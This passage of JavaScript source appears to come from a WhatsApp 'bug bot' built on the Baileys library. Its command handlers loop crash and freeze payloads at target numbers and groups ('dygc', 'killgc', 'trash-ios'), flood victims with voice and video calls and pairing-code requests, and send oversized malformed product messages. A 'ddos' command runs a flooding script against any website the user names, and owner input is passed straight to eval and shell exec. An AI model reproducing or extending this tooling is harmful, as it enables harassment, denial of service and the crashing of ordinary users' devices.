│፨ 𝚗𝚘𝚝𝚎 : 𝚠𝚊𝚒𝚝 𝚏𝚘𝚛 3 𝚖𝚒𝚗𝚜
└─────────`)
for (let i = 0; i < 70; i++) {
await allin(target)


}
reply(`
┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚘𝚠𝚗 🌒
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
└─────────`)
await sleep(2000)
await sam.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: zets
})
}
break




case 'dygc': {
if (!isOwner) return reply(`*YOU ARE NOT A PREMIUM MEMBER DIMWIT*`)
if (!q) return reply(`Use .${command} https://chat.whatsapp.com/`)
reply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚙𝚛𝚘𝚌𝚎𝚜𝚜𝚒𝚗𝚐 🪐
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
│፨ 𝚗𝚘𝚝𝚎 : 𝚠𝚊𝚒𝚝 𝚏𝚘𝚛 3 𝚖𝚒𝚗𝚜
└───────── `)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await sam.groupAcceptInvite(result);
for (let i = 0; i < 70; i++) {
await freezegc(target)
await xgc(target)
await newsLetter1(target, cct = true, ptcp = true)
await sleep(10)
await newsLetter(target, cct = true, ptcp = true)
await xgc2(target)
}
reply(`
┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚘𝚠𝚗 🌒
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
└─────────`)
await sleep(2000)
await sam.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: zets
})
}
break

case 'killgc': {
   if (!isOwner) return reply(`YOU ARE NOT A PREMIUM MEMBER MF💀`)
if (!q) return reply(`Example: ${prefix + command} gcid`)
target = q
reply(`Wait Your Target is being Utilised`) 

    
    // Function to convert text to invisible characters
await newsLetter(target, true)
await xgc(target)
await newsLetter(target)
await freezegc(target, true)
await xgc2(target)


    reply(`
    𝗦𝗨𝗖𝗖𝗘𝗙𝗨𝗟 𝗦𝗘𝗡𝗧 : ${command}\n𝗧𝗢 : ${target}\n 𝗣𝗔𝗨𝗦𝗘 𝗙𝗢𝗥 3 𝗠𝗜𝗡𝗦 𝗕𝗘𝗙𝗢𝗥𝗘 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗔𝗚𝗔𝗜𝗡
    `);

    await sleep(2000);
    await sam.sendMessage(m.chat, {
        audio: bug,
        mimetype: 'audio/mpeg'
    }, { quoted: m });
}
break;
case 'spamcall' : {
 if (!isOwner) return reply(`*YOU ARE NOT A PREMIUM MEMBER DIMWIT*`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚜𝚎𝚗𝚍𝚒𝚗𝚐 𝚜𝚙𝚊𝚖 𝚌𝚊𝚕𝚕 🌒
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
└─────────`)

for (let j = 0; j < 30; j++) {
 await sendOfferCall(target)
  }
   sam.sendMessage(m.chat, {react: {text: '✅', key: m.key}})

}

break
 case 'spamvid' : {

 if (!isOwner) return reply(`*YOU ARE NOT A PREMIUM MEMBER DIMWIT*`)

target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚜𝚎𝚗𝚍𝚒𝚗𝚐 𝚜𝚙𝚊𝚖 𝚟𝚒𝚍 🌒
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
└─────────`)

for (let j = 0; j < 30; j++) {

 await sendOfferVideoCall(target)

  }

   sam.sendMessage(m.chat, {react: {text: '✅', key: m.key}})

}

break

case 'dreams': case 'death':{
if (!isOwner) return reply(`*YOU ARE NOT A PREMIUM MEMBER DIMWIT*`)
reply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚘𝚠𝚗 🌒
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
└─────────`)
for (let j = 0; j < 30; j++) {
await allin(m.chat)
}

sam.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}

break

	case 'deletebot':
	if (!isOwner) return reply(mess.premium)
	if (!q) return reply(`Example:\n ${prefix + command} 254###`)
victim = text.split("|")[0]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await sam.onWhatsApp(Xreturn);
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
    const userToDelete = Xreturn; // Assuming the sender is the user to be deleted
    const sessionPath = `./lib2/pairing/${userToDelete}`;
    
    // Function to delete user session
    const deleteUserSession = (folderPath) => {
        if (fs.existsSync(folderPath)) {
            fs.readdirSync(folderPath).forEach(file => {
                const curPath = path.join(folderPath, file);
                fs.lstatSync(curPath).isDirectory() ? deleteUserSession(curPath) : fs.unlinkSync(curPath);
            });
            fs.rmdirSync(folderPath);
            console.log(chalk.green(`Successfully deleted session for user: ${userToDelete}`));
        } else {
            console.log(chalk.red(`Session for user: ${userToDelete} does not exist.`));
        }
    };
    
    try {
        deleteUserSession(sessionPath);
        // Notify user about removal
        await reply(`Successfully removed rent bot access for user: ${userToDelete}.`)
    } catch (err) {
        console.error(chalk.red(`Error while deleting session for user: ${userToDelete}`), err);
        await reply(`Failed to remove rent bot access for user: ${userToDelete}. Please try again.`)
    }
    break;
    
	case 'dyrent':
	if (!isOwner) return reply(mess.premium)
if (!q) return reply(`Example:\n ${prefix + command} 254###`)
target = text.split("|")[0]
sjid = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : target.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await sam.onWhatsApp(sjid);
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
const startpairing = require('./rentbot.js');
await startpairing(sjid);
await sleep(4000)
const cu = fs.readFileSync('./lib2/pairing/pairing.json', 'utf-8');
const cuObj = JSON.parse(cu);
await sam.relayMessage(from, {
viewOnceMessage: {
message: {
interactiveMessage: {
body: {text: ` Code: ${cuObj.code}\n*Use this Code to become a bot.*\n\n
	1. On your WhatsApp home page, click on the three dots in the top right corner.
	2. Tap *Link Device*
	3. Tap *Link a devics*
	4. Just below there will be a *Link with phone number instead*, tap on it
	5. Paste your 8 character code.`},
header: {},
nativeFlowMessage: {
buttons: [{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "COPY",
url: `https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp${cuObj.code}`,
copy_code: cuObj.code,
})},
]}}}}}, {});
break;



case "invis": case "trash-ios": {
if (!isOwner) return reply(`*YOU ARE NOT A PREMIUM MEMBER DIMWIT*`)
if (!q) return reply(`Example\n ${prefix + command} 254xxxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚙𝚛𝚘𝚌𝚎𝚜𝚜𝚒𝚗𝚐 🪐
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
│፨ 𝚗𝚘𝚝𝚎 : 𝚠𝚊𝚒𝚝 𝚏𝚘𝚛 3 𝚖𝚒𝚗𝚜
└─────────`)
for (let i = 0; i < 10; i++) {
await iosc(target)
await iosc(target)
await sleep(1)
}
sam.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}
break

case 'spampair': {
	if (!isOwner) return reply(mess.premium)
			if (!q) return reply(`_Use : ${prefix+command} number\n_Example : ${prefix+command} 254####`)
			let [peenis, pepekk = "200"] = q.split("|")
			
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@adiwajshing/baileys')
			let {
				state
			} = await useMultiFileAuthState('XSession')
			let {
				version
			} = await fetchLatestBaileysVersion()
	 reply(`Success!`)
			let sucked = await makeWaSocket({
				auth: state,
				version,
				logger: pino({
					level: 'fatal'
				})
			})
			for (let i = 0; i < pepekk; i++) {
				await sleep(1500)
				let prc = await sucked.requestPairingCode(target)
				await console.log(`Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(15000)
			}
		break
case 'ddos':{
	if (!isOwner) return reply(mess.premium)
if (!q.includes(' ')) return reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.xyz 60`)
if (q.includes('dgxeon.shop')){
	return reply(`Cannot attack developer's site`);
	}
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
reply(`Bot is attacking ${targetweb} with time ${timeweb}`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          reply(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          reply(`Error: ${stderr}`);
          return;
        }
        reply(`Success\n\n🤙 target: ${targetweb},\n🤙 Time: ${timeweb}`);
      });  
      }                 
break



case 'clearbug':{
reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
                    }
break

case "checkhost": {
	if (!isOwner) return reply(mess.premium)
if (!q) return reply(`Example : ${prefix + command} https://nxnn.com`)
let msg = { viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": "p"
    },
    "body": {
      "text": "Click Chech Host To Check Web"
    },
    "footer": {
      "text": `𝙳𝚈𝙽𝙰𝙼𝙸𝙲-𝚅3`
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": JSON.stringify( {display_text : 'Check Host' , url : `https://check-host.net/check-http?host=${q}`, merchant_url : `https://check-host.net/check-http?host=${q}` })
        }
      ],
      "messageParamsJson": ""
    }
  }
}
}
}
sam.relayMessage(m.chat, msg, {});
}
break

case 'dyweb':
if (!isOwner) return reply(mess.premium)
try {
for (let i = 0; i < 10; i++) {
messa = await prepareWAMessageMedia({
image: {
url: `https://pic.re/image`
}
}, {
upload: sam.waUploadToServer
})
catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"itemCount": 99999999999,
"title": `PC KILLER X`,
"description": ``,
"currencyCodeIso4217": "IDR",
"footerText": ``,
"productImageCount": 99999999999999999999,
"firstImageId": 9999999999,
"priceAmount1000": "999",
"salePriceAmount1000": "IDR 99.99999999999999999999",
"thumbnail": messa.imageMessage,
"jpegThumbnail": m,
"firstImageId": 99999999,
"url": "wa.me/5512981791389"
},
"businessOwnerJid": from,
}
}), {
userJid: sam.user.id,
quoted: null
})
sam.relayMessage(from, catalog.message, {
messageId: catalog.key.id
})
}
} catch (e) {
console.log(e);
}
break
//============
default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await reply(require('util').format(teks))
}
}

if (budy.startsWith('π')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}

//====================================\\
} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
